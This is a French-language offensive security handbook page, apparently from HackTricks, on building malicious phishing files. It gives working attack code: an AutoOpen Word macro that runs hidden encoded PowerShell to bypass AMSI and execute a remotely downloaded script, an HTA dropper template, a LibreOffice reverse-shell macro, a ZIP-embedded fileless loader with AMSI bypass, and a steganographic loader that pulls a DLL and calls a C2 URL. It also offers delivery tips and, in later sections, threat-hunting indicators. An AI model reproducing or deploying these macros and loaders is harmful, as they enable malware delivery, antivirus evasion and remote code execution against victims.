# Fichiers et documents de phishing

{{#include ../../banners/hacktricks-training.md}}

## Documents Office

Microsoft Word effectue une validation des données du fichier avant de l’ouvrir. Cette validation consiste à identifier la structure des données en la comparant à la norme OfficeOpenXML. Si une erreur survient lors de l’identification de la structure des données, le fichier analysé ne sera pas ouvert.

En général, les fichiers Word contenant des macros utilisent l’extension `.docm`. Toutefois, il est possible de renommer le fichier en changeant son extension tout en conservant la capacité d’exécuter ses macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
Les mêmes mécanismes internes s’appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :

```bash
assoc | findstr /i "word excel powerp"
```

Les fichiers DOCX faisant référence à un modèle distant (File –Options –Add-ins –Manage: Templates –Go) qui contient des macros peuvent également « exécuter » des macros.

### Chargement d’image externe

Allez dans : _Insert --> Quick Parts --> Field_\
_**Categories** : Links and References, **Filed names** : includePicture, et **Filename or URL :**_ http://<ip>/whatever

![Documents Office - Chargement d’image externe : allez dans Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Backdoor par macros

Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions à chargement automatique

Plus elles sont courantes, plus il est probable que l’antivirus les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros

```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```

#### Supprimer manuellement les métadonnées

Allez dans **Fichier > Informations > Inspecter le document > Inspecter le document** pour ouvrir l’Inspecteur de document. Cliquez sur **Inspecter**, puis sur **Tout supprimer** à côté de **Propriétés du document et informations personnelles**.

#### Extension de document

Une fois terminé, sélectionnez la liste déroulante **Type de fichier**, puis remplacez le format **`.docx`** par **Word 97-2003 `.doc`**.\
Faites-le, car vous **ne pouvez pas enregistrer de macros dans un fichier `.docx`** et que l’extension **`.docm`**, qui active les macros, a **mauvaise réputation** (par exemple, l’icône de vignette comporte un énorme `!` et certaines passerelles web/e-mail les bloquent complètement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
  - [**macphish**](https://github.com/cldrn/macphish)
  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros à exécution automatique dans les documents ODT de LibreOffice (Basic)

Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement à l’ouverture du fichier en associant la macro à l’événement **Ouvrir le document** (Outils → Personnaliser → Événements → Ouvrir le document → Macro…).<sup>[[1]](#references)</sup> Voici un exemple simple de macro reverse shell :

```vb
Sub Shell
    Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```

Notez les guillemets doublés (`""`) dans la chaîne : LibreOffice Basic les utilise pour échapper les guillemets littéraux. Les payloads se terminant par `...==""")` gardent ainsi équilibrés à la fois la commande interne et l'argument Shell.

Conseils de livraison :

- Enregistrez le fichier au format `.odt` et associez la macro à l'événement du document afin qu'elle s'exécute immédiatement à l'ouverture.
- Pour envoyer un e-mail avec `swaks`, utilisez `--attach @resume.odt` (le `@` est requis pour envoyer les octets du fichier, et non la chaîne correspondant au nom du fichier, en pièce jointe). C'est essentiel pour exploiter des serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.

## Fichiers HTA

Un HTA est un programme Windows qui **combine HTML et des langages de script (comme VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute comme une application « entièrement approuvée », sans les contraintes du modèle de sécurité d'un navigateur.

Un HTA s'exécute à l'aide de **`mshta.exe`**, généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d'IE**. S'il a été désinstallé, les HTA ne pourront donc pas s'exécuter.

```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
  Function var_func()
  	var_shellcode = "<shellcode>"

  	Dim var_obj
  	Set var_obj = CreateObject("Scripting.FileSystemObject")
  	Dim var_stream
  	Dim var_tempdir
  	Dim var_tempexe
  	Dim var_basedir
  	Set var_tempdir = var_obj.GetSpecialFolder(2)
  	var_basedir = var_tempdir & "\" & var_obj.GetTempName()
  	var_obj.CreateFolder(var_basedir)
  	var_tempexe = var_basedir & "\" & "evil.exe"
  	Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
  	For i = 1 to Len(var_shellcode) Step 2
  	    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
  	Next
  	var_stream.Close
  	Dim var_shell
  	Set var_shell = CreateObject("Wscript.Shell")
  	var_shell.run var_tempexe, 0, true
  	var_obj.DeleteFile(var_tempexe)
  	var_obj.DeleteFolder(var_basedir)
  End Function

  var_func
  self.close
</script>
```

## Forcer l’authentification NTLM

Il existe plusieurs façons de **forcer l’authentification NTLM « à distance »**. Par exemple, vous pouvez ajouter des **images invisibles** à des e-mails ou à du HTML auquel l’utilisateur accèdera (même via un HTTP MitM ?). Vous pouvez aussi envoyer à la victime **l’adresse de fichiers** qui **déclencheront** une **authentification** dès **l’ouverture du dossier**.

**Découvrez ces idées et d’autres encore dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N’oubliez pas que vous pouvez non seulement voler le hash ou les identifiants d’authentification, mais aussi **effectuer des attaques NTLM Relay** :

- [**Attaques NTLM Relay**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay vers les certificats)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## Loaders LNK + payloads intégrés dans un ZIP (chaîne fileless)

Les campagnes très efficaces distribuent un ZIP contenant deux documents leurres légitimes (PDF/DOCX) et un fichier .lnk malveillant. L’astuce consiste à stocker le loader PowerShell proprement dit dans les octets bruts du ZIP, après un marqueur unique ; le .lnk l’extrait et l’exécute entièrement en mémoire.<sup>[[2]](#references)</sup>

Flux habituel mis en œuvre par la commande PowerShell sur une seule ligne du .lnk :

1) Rechercher le ZIP d’origine dans les emplacements courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData% et le dossier parent du répertoire de travail actuel.
2) Lire les octets du ZIP et rechercher un marqueur codé en dur (par exemple, xFIQCV). Tout ce qui suit le marqueur constitue le payload PowerShell intégré.
3) Copier le ZIP dans %ProgramData%, l’extraire à cet emplacement et ouvrir le fichier .docx leurre pour donner une apparence légitime.
4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Déobfusquer l’étape suivante (par exemple, supprimer tous les caractères #) et l’exécuter en mémoire.

Exemple de squelette PowerShell permettant d’extraire et d’exécuter l’étape intégrée :

```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
  "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
  "$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```

Remarques
- La livraison abuse souvent de sous-domaines PaaS réputés (par ex. *.herokuapp.com) et peut filtrer les payloads (servir des ZIP bénins en fonction de l’adresse IP/du UA).
- L’étape suivante déchiffre fréquemment du shellcode encodé en base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc afin de réduire au minimum les artefacts sur disque.

Persistance utilisée dans la même chaîne
- Détournement de COM TypeLib du contrôle Microsoft Web Browser, afin qu’IE/Explorer ou toute application qui l’intègre relance automatiquement le payload.<sup>[[2]](#references)[[4]](#references)</sup> Voir les détails et les commandes prêtes à l’emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Recherche/IOC
- Fichiers ZIP contenant la chaîne marqueur ASCII (par ex., xFIQCV) ajoutée aux données de l’archive.
- Fichier .lnk qui parcourt les dossiers parents/de l’utilisateur pour trouver le ZIP et ouvre un document leurre.
- Altération d’AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Longs fils de discussion professionnels se terminant par des liens hébergés sur des domaines PaaS de confiance.

## Mise en scène avec leurre .lnk en premier → persistance par tâche planifiée → side-loading de CPL de confiance

Un autre schéma récurrent est un **`.lnk` se faisant passer pour un document** qui ouvre immédiatement un leurre bénin tout en préparant la véritable chaîne en arrière-plan.<sup>[[3]](#references)</sup>

Flux observé :
1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe` ou un proxy similaire pour lancer un téléchargeur PowerShell obfusqué.
2. PowerShell fragmente des tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves recherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ne détectent pas la commande.
3. Le stager télécharge d’abord le **document leurre**, l’ouvre pour la victime, puis reconstitue les fichiers malveillants en arrière-plan.
4. Les payloads peuvent être écrits avec des **extensions fantaisistes**, puis renommés en supprimant des caractères de remplissage, ce qui retarde l’apparition d’artefacts `.exe` / `.cpl` évidents.
5. La persistance est mise en place au moyen d’une **tâche planifiée à intervalle d’une minute** qui lance un binaire hôte de confiance depuis un chemin accessible en écriture par l’utilisateur.

Indices minimaux pour la recherche basés sur ce schéma :

```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```

Une disposition de staging utile à reconnaître est :
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Pourquoi le second stage est furtif

Dans l’étude de cas de Rapid7, la tâche planifiée lançait régulièrement **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était placé à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance chargeait en side-loading le CPL de l’attaquant à la place de la copie système légitime.

Le CPL :
- Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
- Le déchiffre via **Windows CNG / `bcrypt.dll`**
- Alloue de la mémoire exécutable et y copie le shellcode déchiffré
- L’exécute indirectement en transmettant le pointeur du shellcode comme callback à **`EnumUILanguagesW`**

Cette dernière étape mérite d’être recherchée séparément : les malwares évitent souvent le saut direct `((void(*)())buf)()` et abusent plutôt d’une **WinAPI légitime qui accepte un callback** pour transférer l’exécution.

La payload déchiffrée dans cette campagne était du shellcode **Donut**, qui a ensuite mappé le PE final entièrement en mémoire et patché **AMSI/WLDP/ETW** dans le processus courant avant de transférer l’exécution. Pour des notes plus détaillées sur le side-loading et le post-traitement en mémoire, voir :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pistes pratiques à rechercher :
- Fichier `.lnk` lançant `powershell.exe` ou `conhost.exe`, suivi de l’apparition d’un document leurre visible.
- Téléchargements de courte durée dans **`C:\Users\Public\`**, suivis de renommages immédiats depuis des extensions absurdes.
- Tâches planifiées aux noms anodins, comme `GoogleErrorReport`, exécutées depuis des **répertoires accessibles en écriture par l’utilisateur**.
- Binaires de confiance chargeant des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
- Blobs texte Base64 écrits sous **`C:\Windows\Tasks\`**, puis lus par le module chargé en side-loading.

## Payloads délimitées par stéganographie dans des images (stager PowerShell)

Des chaînes de chargement récentes livrent un JavaScript/VBS obfusqué qui décode et exécute un stager PowerShell Base64. Ce stager télécharge une image (souvent un GIF) contenant une DLL .NET encodée en Base64 et dissimulée sous forme de texte brut entre des marqueurs uniques de début et de fin. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte situé entre eux, le décode en Base64 en octets, charge l’assembly en mémoire et invoque une méthode d’entrée connue avec l’URL du C2.<sup>[[5]](#references)</sup>

Flux de travail
- Stage 1 : dropper JS/VBS archivé → décode le Base64 intégré → lance le stager PowerShell avec -nop -w hidden -ep bypass.
- Stage 2 : stager PowerShell → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par ex. VAI) en lui transmettant l’URL du C2 et les options.
- Stage 3 : le loader récupère la payload finale et l’injecte généralement par process hollowing dans un binaire de confiance (souvent MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Pour en savoir plus sur le process hollowing et l’exécution par proxy via des utilitaires de confiance, voir :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL d’une image et invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur et loader PowerShell de payload stéganographique</summary>

```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
  [string]$Url    = 'https://example.com/payload.gif',
  [string]$StartM = '<<sudo_png>>',
  [string]$EndM   = '<<sudo_odt>>',
  [string]$EntryType = 'Loader',
  [string]$EntryMeth = 'VAI',
  [string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```

</details>

Notes
- Il s’agit de ATT&CK T1027.003 (stéganographie/masquage de marqueurs).<sup>[[6]](#references)</sup> Les marqueurs varient selon les campagnes.
- Le bypass d’AMSI/ETW et la désobfuscation des chaînes sont souvent effectués avant le chargement de l’assembly.
- Recherche de menaces : analyser les images téléchargées à la recherche de délimiteurs connus ; repérer PowerShell accédant à des images et décodant immédiatement des blobs Base64.

Voir aussi les outils de stéganographie et les techniques d’extraction :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## Droppers JS/VBS → staging PowerShell via Base64

Une étape initiale récurrente consiste en un fichier `.js` ou `.vbs` compact et fortement obfusqué, livré dans une archive. Son seul objectif est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` pour amorcer l’étape suivante via HTTPS.<sup>[[5]](#references)</sup>

Logique de base (abstraite) :
- Lire le contenu de son propre fichier
- Repérer un blob Base64 entre des chaînes parasites
- Décoder en PowerShell ASCII
- Exécuter avec `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`

Indices de recherche
- Des pièces jointes JS/VBS archivées qui lancent `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` qui lance `powershell.exe -nop -w hidden` depuis des répertoires temporaires utilisateur.

## Documents MSC comme conteneurs d’exécution (GrimResource)

Les fichiers Microsoft Management Console (`.msc`) sont des définitions de console XML normalement ouvertes par `mmc.exe`. **GrimResource** exploite une référence `StringTable` vers une ressource `apds.dll` contenant une ancienne primitive XSS, de sorte que l’ouverture de la console piégée par un utilisateur provoque l’exécution de JavaScript dans `mmc.exe`. Les échantillons observés combinaient une obfuscation basée sur `transformNode` avec **DotNetToJScript** pour instancier une charge utile .NET sans passer par le chemin habituel des macros Office.<sup>[[9]](#references)</sup>

Pour le triage statique, traitez tout fichier MSC non fiable comme du texte et ne double-cliquez pas dessus :<sup>[[9]](#references)</sup>

```bash
file lure.msc
xmllint --format lure.msc > lure.formatted.xml
grep -Eina 'apds\.dll|res://|StringTable|transformNode|ActiveXObject|FromBase64String' lure.formatted.xml
strings -el lure.msc | grep -Ei 'powershell|cmd\.exe|http|base64'
```

Les pivots d’exécution à forte valeur indicative sont le chargement du CLR ou de composants de script par `mmc.exe`, la création de connexions réseau, ou le lancement de `powershell.exe`, `cmd.exe`, `wscript.exe`, `cscript.exe`, `mshta.exe`, `rundll32.exe` ou d’un exécutable inattendu. Le format est légitime : les détections devraient donc corréler **la provenance + le contenu XML/script suspect + le comportement de `mmc.exe`** plutôt que de bloquer tous les fichiers MSC.<sup>[[9]](#references)</sup>

## Redirections par PDF/QR et contrôle de livraison des payloads

Un PDF n’a pas besoin d’exploiter une vulnérabilité pour être utile. Des campagnes récentes placent un **code QR ou un lien ordinaire** dans un document d’apparence anodine, font sortir la session du navigateur des contrôles de messagerie et personnalisent la destination avec l’adresse du destinataire. Microsoft a documenté en 2025 des PDF dont les URL de QR étaient uniques à chaque destinataire et menaient à une infrastructure de vol d’identifiants RaccoonO365 ; une chaîne parallèle utilisait un filtrage par IP/environnement pour renvoyer un chemin JavaScript/MSI à certains visiteurs, mais un PDF inoffensif aux scanners ou aux clients non autorisés.<sup>[[10]](#references)</sup>

Examinez les actions des PDF ainsi que les codes QR rendus. Un QR peut être dessiné sous forme vectorielle plutôt qu’enregistré comme image extractible ; convertissez donc chaque page en image matricielle et extrayez également les images intégrées :

```bash
pdfid.py lure.pdf
pdfdetach -list lure.pdf
qpdf --qdf --object-streams=disable lure.pdf expanded.pdf
grep -aE '/(URI|OpenAction|AA|Launch|EmbeddedFile)|https?://' expanded.pdf
pdfimages -png lure.pdf image
pdftoppm -png -r 300 lure.pdf page
zbarimg --quiet image-*.png page-*.png
```

Inspectez les destinations décodées et les redirections depuis un système d'analyse isolé, sans vous authentifier. Parmi les indicateurs utiles à rechercher : des PDF contenant uniquement des QR codes accompagnés de courriels presque vides, l'adresse e-mail du destinataire intégrée à un paramètre de requête, plusieurs redirections passant par des services d'hébergement réputés et des contenus différents renvoyés selon l'adresse IP, la géolocalisation, les cookies, le referrer ou l'agent utilisateur. Comparez les requêtes à l'aide de profils contrôlés, car une seule récupération depuis un sandbox peut ne renvoyer que le leurre.<sup>[[10]](#references)</sup>

## Fichiers Windows pour voler des hashes NTLM

Consultez la page sur les **endroits où voler des creds NTLM** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}




## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant des entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode : suivi des techniques de Dropping Elephant à travers une chaîne de loaders sur le thème de la Chine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Détourner le TypeLib – Nouvelle technique de persistance COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Le loader PhantomVAI distribue plusieurs infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Stéganographie (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Exécution par proxy via des utilitaires de développement approuvés : MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
- [9] [Elastic Security Labs – GrimResource : Microsoft Management Console pour l'accès initial et l'évasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Des acteurs malveillants profitent de la période des impôts pour déployer des campagnes de phishing sur le thème des impôts](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
{{#include ../../banners/hacktricks-training.md}}
